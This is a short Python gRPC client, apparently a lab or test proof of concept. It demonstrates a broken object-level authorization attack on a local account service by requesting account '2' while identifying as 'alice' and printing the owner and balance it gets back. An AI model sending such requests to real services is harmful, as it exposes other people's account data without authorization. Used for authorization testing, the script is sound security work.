import grpc
import account_pb2
import account_pb2_grpc

def run():
    with grpc.insecure_channel('localhost:50051') as channel:
        stub = account_pb2_grpc.AccountServiceStub(channel)
        
        # BOLA Attack: Requesting account '2' while identifying as 'alice'
        request = account_pb2.AccountRequest(acc_id="2", user_id="alice")
        
        try:
            response = stub.GetAccount(request)
            print(f"gRPC Result: Owner: {response.owner}, Balance: {response.balance}")
        except grpc.RpcError as e:
            print(f"Error: {e.details()}")

if __name__ == "__main__":
    run()
